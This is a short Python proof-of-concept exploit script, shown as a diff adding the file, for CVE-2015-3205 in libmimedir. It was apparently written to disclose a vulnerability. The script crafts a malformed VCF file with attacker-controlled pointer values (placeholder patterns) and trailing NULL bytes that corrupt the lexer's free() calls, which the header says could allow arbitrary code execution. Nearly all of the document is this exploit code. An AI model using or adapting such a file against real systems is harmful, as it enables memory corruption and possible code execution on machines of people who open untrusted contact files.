@@ -1,0 +1,51 @@
+#!/usr/bin/python
+# libmimedir-free.py
+#
+# Libmimedir VCF Memory Corruption PoC (CVE-2015-3205)
+#
+# Jeremy Brown [jbrown3264/gmail]
+# June 2015
+#
+# -Synopsis-
+#
+# Adding two NULL bytes to the end of a VCF file allows a user to manipulate free() calls
+# which occur during it's lexer's memory clean-up procedure. This could lead to exploitable
+# conditions such as crafting a specific memory chunk to allow for arbitrary code execution.
+#
+# -Tested-
+#
+# libmimedir-0.5.1.tar.gz
+# libmimedir-static 0.4-13.fc21
+#
+# -Notes-
+#
+# Reported to Red Hat Bugzilla in May (1222251) and remains unfixed as of now. There's already
+# a stale bug (1049214) to upgrade to latest upstream and there wasn't a movement to work on a
+# fix with this one. yy_get_next_buffer() in dirlex.c would likely take the patch.
+#
+
+from struct import pack
+
+def main():
+    mime = "begin:vcard<x\nx;type=x;type=x,"
+    mime += pack("<Q", 0x4141414141414141) # mdm->p
+    mime += pack("<Q", 0x4242424242424242) # mdm->next
+    mime += ":x>x.l:x"
+    mime += pack("<H", 0x0000) # 2 x YY_END_OF_BUFFER_CHAR
+    
+    print("Writing free.vcf to local directory...")
+    
+    try:
+        with open("free.vcf", 'wb') as outfile:
+            outfile.write(mime)
+
+    except Exception as error:
+        print("Error: %s\n" % error);
+        return
+    
+    print("Done\n")
+    
+    return
+
+if __name__ == "__main__":
+    main()
